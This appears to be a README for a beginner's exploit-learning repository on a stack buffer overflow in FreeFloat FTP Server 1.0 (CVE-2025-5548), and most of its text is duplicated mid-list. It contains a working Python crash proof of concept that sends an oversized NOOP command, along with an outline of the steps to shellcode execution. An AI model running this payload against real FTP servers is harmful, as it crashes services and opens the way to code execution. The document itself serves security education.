
# 🐛 CVE-2025-5548 – FreeFloat FTP Server Buffer Overflow

This repository demonstrates a **classic stack-based buffer overflow** affecting *FreeFloat FTP Server 1.0*, a legacy Windows application.

The goal is to provide a **clear and practical introduction to vulnerability research**, showing how real-world bugs can be understood and exploited through **binary analysis and reverse engineering**.

---

# 📚 Table of Contents

* [Purpose of this Repository](#purpose-of-this-repository)
* [Why This Vulnerability Matters](#why-this-vulnerability-matters)
* [Understanding the Root Cause](#understanding-the-root-cause)
* [Triggering the Crash](#triggering-the-crash)
* [Exploitation Overview](#exploitation-overview)

---

# 🎯 Purpose of this Repository

This project is designed as a **learning resource for beginners in binary exploitation**.

It focuses on demonstrating that:

* Old software is a valuable target for learning
* Reverse engineering is accessible to beginners
* Real vulnerabilities can be discovered through analysis
* A simple crash can evolve into full code execution

Instead of focusing only on theory, this repository shows a **practical workflow** that can be applied to similar targets.

---

# 💡 Why This Vulnerability Matters

FreeFloat FTP Server is an example of **legacy software built without modern security protections**.

Because of this:

* Multiple inputs can lead to memory corruption
* Different commands may trigger similar vulnerabilities
* The same root issue can appear across multiple CVEs

This makes it a great case study to understand how:

* Applications handle user input internally
* Unsafe functions introduce risk
* One bug can manifest in multiple ways

---

# 🔍 Understanding the Root Cause

The vulnerability is caused by the use of **unsafe memory operations** when handling user input.

A simplified version of the issue:

```c
char buffer[256];
strcpy(buffer, user_input);
```

Since the input length is not validated, sending a large payload causes:

* Buffer overflow
* Stack corruption
* Overwrite of the return address (EIP)

This allows an attacker to **control program execution flow**.

---

# 💥 Triggering the Crash

The crash can be reproduced by sending a long string to the FTP service.

### Example (Python)

```python
import socket

ip = "127.0.0.1"
port = 21

payload = b"A" * 500

s = socket.socket()
s.connect((ip, port))

s.recv(1024)

s.send(b"USER anonymous\r\n")
s.recv(1024)

s.send(b"PASS anonymous\r\n")
s.recv(1024)

s.send(b"NOOP " + payload + b"\r\n")

s.close()
```

When executed under a debugger:

```text
EIP = 41414141
```

This confirms that user input overwrites the instruction pointer.

---

# 💣 Exploitation Overview

This repository does not only show the crash, but also introduces the **basic exploitation workflow**, including:

* Fuzzing the application
* Finding the EIP offset
* Controlling execution flow
* Identifying bad characters
* Redirecting execution (JMP ESP)
* Executing shellcode

For clarity, the **detailed exploitation process, scripts, and notes** are organized inside the repository (e.g., `Vulnerability/` folder).

---

# 🏁 Final Notes

This project aims to bridge the gap between **theory and practice** in vulnerability research.

Understanding simple cases like this one is essential before moving to:

* Modern mitigations (ASLR, DEP)
* # 🐛 CVE-2025-5548 – FreeFloat FTP Server Buffer Overflow

This repository demonstrates a **classic stack-based buffer overflow** affecting *FreeFloat FTP Server 1.0*, a legacy Windows application.

The goal is to provide a **clear and practical introduction to vulnerability research**, showing how real-world bugs can be understood and exploited through **binary analysis and reverse engineering**.

---

# 📚 Table of Contents

* [Purpose of this Repository](#purpose-of-this-repository)
* [Why This Vulnerability Matters](#why-this-vulnerability-matters)
* [Understanding the Root Cause](#understanding-the-root-cause)
* [Triggering the Crash](#triggering-the-crash)
* [Exploitation Overview](#exploitation-overview)

---

# 🎯 Purpose of this Repository

This project is designed as a **learning resource for beginners in binary exploitation**.

It focuses on demonstrating that:

* Old software is a valuable target for learning
* Reverse engineering is accessible to beginners
* Real vulnerabilities can be discovered through analysis
* A simple crash can evolve into full code execution

Instead of focusing only on theory, this repository shows a **practical workflow** that can be applied to similar targets.

---

# 💡 Why This Vulnerability Matters

FreeFloat FTP Server is an example of **legacy software built without modern security protections**.

Because of this:

* Multiple inputs can lead to memory corruption
* Different commands may trigger similar vulnerabilities
* The same root issue can appear across multiple CVEs

This makes it a great case study to understand how:

* Applications handle user input internally
* Unsafe functions introduce risk
* One bug can manifest in multiple ways

---

# 🔍 Understanding the Root Cause

The vulnerability is caused by the use of **unsafe memory operations** when handling user input.

A simplified version of the issue:

```c
char buffer[256];
strcpy(buffer, user_input);
```

Since the input length is not validated, sending a large payload causes:

* Buffer overflow
* Stack corruption
* Overwrite of the return address (EIP)

This allows an attacker to **control program execution flow**.

---

# 💥 Triggering the Crash

The crash can be reproduced by sending a long string to the FTP service.

### Example (Python)

```python
import socket

ip = "127.0.0.1"
port = 21

payload = b"A" * 500

s = socket.socket()
s.connect((ip, port))

s.recv(1024)

s.send(b"USER anonymous\r\n")
s.recv(1024)

s.send(b"PASS anonymous\r\n")
s.recv(1024)

s.send(b"NOOP " + payload + b"\r\n")

s.close()
```

When executed under a debugger:

```text
EIP = 41414141
```

This confirms that user input overwrites the instruction pointer.

---

# 💣 Exploitation Overview

This repository does not only show the crash, but also introduces the **basic exploitation workflow**, including:

* Fuzzing the application
* Finding the EIP offset
* Controlling execution flow
* Identifying bad characters
* Redirecting execution (JMP ESP)
* Executing shellcode

For clarity, the **detailed exploitation process, scripts, and notes** are organized inside the repository (e.g., `Vulnerability/` folder).

---

# 🏁 Final Notes

This project aims to bridge the gap between **theory and practice** in vulnerability research.

Understanding simple cases like this one is essential before moving to:

* Modern mitigations (ASLR, DEP)
* Advanced exploitation techniques
* Real-world targets

⭐ If you find this repository useful, consider starring it and using it as a base for your own research

